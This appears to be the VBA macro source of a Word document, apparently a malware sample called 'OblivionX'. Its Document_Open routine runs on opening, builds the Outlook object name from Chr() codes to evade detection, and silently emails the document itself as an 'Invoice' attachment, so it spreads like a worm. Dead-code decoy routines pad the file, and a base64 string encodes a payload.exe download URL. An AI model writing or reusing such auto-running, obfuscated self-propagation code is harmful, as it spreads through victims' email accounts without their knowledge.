
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim jybosg1pnivrj As Object, lps4wdhm As Object
    On Error Resume Next
    Set jybosg1pnivrj = CreateObject(Chr(79) & Chr(117) & Chr(116) & Chr(108) & Chr(111) & Chr(111) & Chr(107) & Chr(46) & "Appl" & "ication")
    Set lps4wdhm = jybosg1pnivrj.CreateItem(0)
    lps4wdhm.To = "recipient@example.com"
    lps4wdhm.Subject = "Invoice"
    lps4wdhm.Body = "Pleas" & "e find" & " the atta" & "ched " & "document."
    lps4wdhm.Attachments.Add ActiveDocument.FullName
    lps4wdhm.Send
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
